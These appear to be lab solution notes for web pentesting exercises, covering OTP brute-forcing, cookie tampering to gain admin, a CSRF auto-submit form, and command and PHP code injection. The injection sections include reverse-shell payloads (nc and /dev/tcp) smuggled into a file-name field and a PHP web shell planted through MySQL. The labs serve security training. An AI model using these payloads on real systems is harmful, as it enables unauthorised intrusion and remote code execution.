`zaproxy` > `Fuzzer` > `Fuzz Locations` = `Add` = `Type: Numberzz`, `From: 1000`, `To: 9999`, `Increment: 1` > `Message Processors` = `Add` = `Type: Tag Creator`, `Match: Regex: .*failed*.`, `Tag: Failed` > `Start Fuzzer`

`HTTP Request`:
```http
POST https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev/verify HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 165
Origin: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
Connection: keep-alive
Referer: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev?otp=1234
Cookie: SESSIONID=Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==
Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com

{"sessionid":"Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==","otp":"§1234§"} 📌
```
`HTTP Request`:
```http
POST https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev/verify HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 165
Origin: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
Connection: keep-alive
Referer: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev?otp=1234
Cookie: SESSIONID=Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==
Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com

{"sessionid":"Z0FBQUFBQm5SeTlpUTdDaFR1b0w5cTVyQ09nWDA2Y2RsSjl2bUFrMXA2T2g2bzJoU3ZScjQ1ZW83V2dQTTVSblFyTUV3T2NpeThOUkpBa0ttYV9wR3VaaFhaUmlBNkhCWmc9PQ==","otp":"2999"} 🔑
```

---

## Session Security

### Session Hijacking Via Cookie Tampering

#### Lab Environment

**Improper Session Management III**

[OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.

In the exercise, we will focus on [OWASP A2 Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication) flaws and we will take a look at how to leverage the broken authentication vulnerability on a single page web application.

**Objective**: Leverage the broken authentication vulnerability and access the administrative portal.

The following credentials might be needed:
- Username: "james@secbank.com"
- Password: "password1".

#### Lab Solution

![Lab - Improper Session Management III](./assets/testing_for_common_attacks_lab_improper_session_management_iii.png)

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /login HTTP/1.1
Host: 192.228.47.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure-bank.com:5000/login
Content-Type: application/json;charset=utf-8
Content-Length: 47
Origin: http://secure-bank.com:5000
Connection: close

{"email":"james@secbank.com","password":"password1"} 📌
```
`HTTP Response`:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 20
Set-Cookie: sessid=bG9nZ2VkaW49VHJ1ZTthZG1pbj1GYWxzZQ==; Path=/ 📌
Access-Control-Allow-Origin: http://secure-bank.com:5000
Vary: Origin
Access-Control-Allow-Credentials: true
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Wed, 27 Nov 2024 15:03:24 GMT

{"login": "success"}
```

`echo -n 'bG9nZ2VkaW49VHJ1ZTthZG1pbj1GYWxzZQ==' | base64 -d`:
```
loggedin=True;admin=False
```

`echo -n 'loggedin=True;admin=True' | base64`:
```
bG9nZ2VkaW49VHJ1ZTthZG1pbj1UcnVl 🚩
```

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /login HTTP/1.1
Host: 192.228.47.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure-bank.com:5000/login
Content-Type: application/json;charset=utf-8
Content-Length: 47
Origin: http://secure-bank.com:5000
Connection: close
Cookie: sessid=bG9nZ2VkaW49VHJ1ZTthZG1pbj1UcnVl 📌

{"email":"james@secbank.com","password":"password1"}
```
`HTTP Response`:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 44
Access-Control-Allow-Origin: http://secure-bank.com:5000
Vary: Origin
Access-Control-Allow-Credentials: true
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Wed, 27 Nov 2024 15:13:33 GMT

{"flag": "251e2203c108d0a8eb1a9572199d24d1"} 🚩
```

---

## Cross-Site Request Forgery (CSRF)

### Advanced Electron Forum CSRF

#### Lab Environment

**Advanced Electron Forum**

In this exercise, the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to a CSRF attack. So you can try to find this CSRF as purely academic exercise.

A version of **Advanced Electron Forum** is vulnerable to cross site request forgery attack.

The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access:
- Username: "admin"
- Password: "password1".

**Objective**: Your task is to find and exploit this vulnerability.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ip addr` to know the values of X and Y.
- Do not attack the gateway located at IP address `192.X.Y.1`.

URL: `https://wij0p8tlyeqrezvx1057worm8.eu-central-7.attackdefensecloudlabs.com/`.

#### Lab Solution

![Lab - Advanced Electron Forum](./assets/testing_for_common_attacks_lab_advanced_electron_forum.png)

`searchsploit 'Advanced Electron Forum'`:
```
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Advanced Electron Forum 1.0.6 - 'beg' Cross-Site Scripting                            | php/webapps/31677.txt
Advanced Electron Forum 1.0.6 - Remote Code Execution                                 | php/webapps/6499.txt
Advanced Electron Forum 1.0.9 - Cross-Site Request Forgery 📌                         | php/webapps/39261.txt
Advanced Electron Forum 1.0.9 - Persistent Cross-Site Scripting                       | php/webapps/39262.txt
Advanced Electron Forum 1.0.9 - Remote File Inclusion / Cross-Site Request Forgery    | php/webapps/39263.txt
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`cp /usr/share/exploitdb/exploits/php/webapps/39261.txt ./`

`cat ./39261.txt`:
```
[+] Credits: hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/AEF-CSRF.txt

Vendor:
=============================
www.anelectron.com/downloads/

Product:
====================================
Advanced Electron Forum v1.0.9 (AEF)
Exploit patched current version.

Vulnerability Type:
===================
CSRF

CVE Reference:
==============
N/A

Vulnerability Details:
=====================
In Admin panel no CSRF protections exist in multiple areas allowing remote
attackers to make HTTP request on behalf of the victim if they
currently have a valid session (logged in) and visit or click an infected
link, resulting in some of the following destructions.

0x01: Change current database settings
0x02: Delete all Inbox / Sent Emails
0x03: Delete all 'shouts'
0x04: Delete all Topics

by the way, edit profile, avatar and more all seem vulnerable as well..


Exploit code(s):
===============
CSRF 0x01:

change mysql db settings
note: however you will need to know or guess the database name.

<form id="DOOM" accept-charset="ISO-8859-1" action="
http://localhost/AEF(1.0.9)_Install/index.php?act=admin&adact=conpan&seadact=mysqlset"
method="post" name="mysqlsetform">
<input type="hidden" name="server" value="hyp3rlinx.altervista.org" />
<input type="hidden" name="user" value="hyp3rlinx" />
<input type="hidden" name="password" value="DESTROYED" />
<input type="hidden" name="database" value="AEF" />
<input type="hidden" name="dbprefix" value="aef_" />
<script>document.getElementById('DOOM').submit()</script>
</form>

[...]
```

![Lab - Advanced Electron Forum](./assets/testing_for_common_attacks_lab_advanced_electron_forum_1.png)

`vim ./csrf.html`:
```html
<form id="DOOM" accept-charset="ISO-8859-1" action="
https://wij0p8tlyeqrezvx1057worm8.eu-central-7.attackdefensecloudlabs.com/index.php?act=admin&adact=conpan&seadact=mysqlset"
method="post" name="mysqlsetform">
<input type="hidden" name="server" value="server.site.com" />
<input type="hidden" name="user" value="hacker" />
<input type="hidden" name="password" value="H4ck3d!" />
<input type="hidden" name="database" value="app" />
<input type="hidden" name="dbprefix" value="aef_" />
<script>document.getElementById('DOOM').submit()</script>
</form>
```

`firefox ./csrf.html &`

---

## Injection & Input Validation

### Command Injection

#### Lab Environment

**Vulnerable File Backup Utility - Command Injection**

[OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.

In the exercise, we will focus on [OWASP A1 Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) flaws and we will take a look at how to perform command injection attack on a vulnerable file backup utility application. The application creates a backup of the file in the "backup" directory on the server.

**Objective:** Perform Command Injection on the web app.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ifconfig` to know the values of X and Y.
- Do not attack the gateway located at IP address `192.X.Y.1`.
- The application should be running on port `5000` on the machine located at the IP address `192.X.Y.3`.

#### Lab Solution

`echo 'test' > ./test.txt`

![Lab - Vulnerable File Backup Utility - Command Injection](./assets/testing_for_common_attacks_lab_vulnerable_file_backup_utility_command_injection.png)

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /upload HTTP/1.1
Host: 192.231.94.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://beta.file-backup.com:5000/
Content-Type: application/json
Content-Length: 35
Origin: http://beta.file-backup.com:5000
Connection: close

{"file":"test.txt","data":"test\n"} 📌
```
`HTTP Response`:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 39
Access-Control-Allow-Origin: http://beta.file-backup.com:5000
Vary: Origin
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Wed, 27 Nov 2024 15:45:34 GMT

{"success": "File saved successfully!"}
```

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.231.94.2 📌 netmask 255.255.255.0  broadcast 192.231.94.255
        ether 02:42:c0:e7:5e:02  txqueuelen 0  (Ethernet)
        RX packets 133  bytes 568545 (555.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 12188 (11.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`nc -lnvp 4444`:
```
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /upload HTTP/1.1
Host: 192.231.94.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://beta.file-backup.com:5000/
Content-Type: application/json
Content-Length: 35
Origin: http://beta.file-backup.com:5000
Connection: close

{"file":"test.txt; nc 192.231.94.2 4444 -c '/bin/bash'","data":"test\n"} 📌
```
`HTTP Response`:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 39
Access-Control-Allow-Origin: http://beta.file-backup.com:5000
Vary: Origin
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Wed, 27 Nov 2024 15:52:03 GMT

{"success": "File saved successfully!"}
```

```
Ncat: Connection from 192.231.94.3.
Ncat: Connection from 192.231.94.3:40948.

id
uid=1000 gid=1000 groups=1000,0(root) 🚩
```

🔄 Alternative 🔄

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /upload HTTP/1.1
Host: 192.231.94.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://beta.file-backup.com:5000/
Content-Type: application/json
Content-Length: 35
Origin: http://beta.file-backup.com:5000
Connection: close

{"file":"test.txt; bash -c 'bash -i >& /dev/tcp/192.231.94.2/4444 0>&1'","data":"test\n"} 📌
```
`HTTP Response`:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 39
Access-Control-Allow-Origin: http://beta.file-backup.com:5000
Vary: Origin
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Wed, 27 Nov 2024 15:52:03 GMT

{"success": "File saved successfully!"}
```

```
Ncat: Connection from 192.231.94.3.
Ncat: Connection from 192.231.94.3:42104.
bash: cannot set terminal process group (15): Inappropriate ioctl for device
bash: no job control in this shell
groups: cannot find name for group ID 1000
I have no name!@victim-1:/$

id
uid=1000 gid=1000 groups=1000,0(root) 🚩
```

### PHP Code Injection

#### Lab Environment

**PHP Code Injection**

[OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.

In the exercise, we will focus on [OWASP A1 Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) flaws and we will take a look at how to perform PHP code injection attack on [bWAPP](http://www.itsecgames.com/) web application.

**Objective**: Perform code injection on the web application and execute arbitrary commands on the target machine.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ip addr` to know the values of X and Y.
- Do not attack the gateway located at IP address `192.X.Y.1`.

The following credentials might be needed:
- Username: "bee"
- Password: "bug".

#### Lab Solution

`ifconfig`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.146.24.2 📌 netmask 255.255.255.0  broadcast 192.146.24.255
        ether 02:42:c0:92:18:02  txqueuelen 0  (Ethernet)
        RX packets 15  bytes 1306 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![Lab - PHP Code Injection](./assets/testing_for_common_attacks_lab_php_code_injection.png)

`burpsuite` > `Repeater`

`HTTP Request`:
```http
GET /phpi.php?message=test HTTP/1.1 📌
Host: 192.146.24.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ninhe461b4eaiodht0pb5g9990; security_level=0
Upgrade-Insecure-Requests: 1
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Wed, 27 Nov 2024 16:06:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 12741
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html>

[...]

    <h1>PHP Code Injection</h1>

    <p>This is just a test page, reflecting back your <a href="/phpi.php?message=test">message</a>...</p>
    
    <p><i>test</i></p> 📌

[...]
```

`burpsuite` > `Repeater`

`HTTP Request`:
```http
GET /phpi.php?message=test;phpinfo() HTTP/1.1 📌
Host: 192.146.24.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ninhe461b4eaiodht0pb5g9990; security_level=0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Wed, 27 Nov 2024 16:06:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 12741
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html>

[...]

    <h1>PHP Code Injection</h1>

    <p>This is just a test page, reflecting back your <a href="/phpi.php?message=test">message</a>...</p>
    
    <p><i>test<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #ffffff; color: #000000;}
body, td, th, h1, h2 {font-family: sans-serif;}
pre {margin: 0px; font-family: monospace;}
a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse;}
.center {text-align: center;}
.center table { margin-left: auto; margin-right: auto; text-align: left;}
.center th { text-align: center !important; }
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccccff; font-weight: bold; color: #000000;}
.h {background-color: #9999cc; font-weight: bold; color: #000000;}
.v {background-color: #cccccc; color: #000000;}
.vr {background-color: #cccccc; text-align: right; color: #000000;}
img {float: right; border: 0px;}
hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;} 📌

[...]
```

`burpsuite` > `Repeater`

`HTTP Request`:
```http
GET /phpi.php?message=test;system(%22id%22) HTTP/1.1 📌
Host: 192.146.24.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ninhe461b4eaiodht0pb5g9990; security_level=0
Upgrade-Insecure-Requests: 1
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Wed, 27 Nov 2024 16:06:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 12741
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html>

[...]

    <h1>PHP Code Injection</h1>

    <p>This is just a test page, reflecting back your <a href="/phpi.php?message=test">message</a>...</p>
    
    <p><i>testuid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
</i></p>

[...]
```

---

## Security Misconfigurations

### RCE Via MySQL

#### Lab Environment

**RCE via MySQL**

[OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.

In the exercise, we will focus on [OWASP A6 Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration) flaws and we will take a look at how to leverage misconfigured MySQL service to execute arbitrary command on the target machine.

**Objective**: Leverage the misconfiguration and execute arbitrary commands on the target machine.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ip addr` to know the values of X and Y.
- Do not attack the gateway located at IP address `192.X.Y.1`.

#### Lab Solution

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.249.241.2 📌 netmask 255.255.255.0  broadcast 192.249.241.255
        ether 02:42:c0:f9:f1:02  txqueuelen 0  (Ethernet)
        RX packets 16  bytes 1376 (1.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`sudo nmap -Pn -sSV --script=mysql-empty-password -p 3306 192.249.241.3`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-11-27 21:47 IST
Nmap scan report for target-1 (192.249.241.3)
Host is up (0.000046s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.56-log
| mysql-empty-password: 
|_  root account has empty password 📌
MAC Address: 02:42:C0:F9:F1:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

`sudo nmap -Pn -sSV -p 80 192.249.241.3`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-11-27 21:49 IST
Nmap scan report for target-1 (192.249.241.3)
Host is up (0.000040s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 📌
MAC Address: 02:42:C0:F9:F1:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
```

`whatweb http://192.249.241.3`:
```
http://192.249.241.3 [200 OK] Apache[2.4.18], Cookies[PHPSESSID], 📌 Country[CANADA][CA], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.249.241.3], JQuery, Script, Title[Welcome to Adive!]
```

`mysql -u root -h 192.249.241.3`:
```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 5.5.56-log MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| adive              |
| mysql              | 📌
| performance_schema |
| test               |
+--------------------+
5 rows in set (0.002 sec)
```
```
MySQL [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
```
MySQL [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
24 rows in set (0.009 sec)
```
```
MySQL [(none)]> select 'Hello world!' into outfile '/tmp/test.txt' from mysql.user limit 1;
Query OK, 1 row affected (0.001 sec)
```
```
MySQL [(none)]> select '<?php $output=shell_exec($_GET["cmd"]); echo "<pre>".$output."</pre>" ?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 📌
Query OK, 1 row affected (0.002 sec)
```

`curl http://192.249.241.3/shell.php?cmd=id`:
```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
</pre>
```

---
---
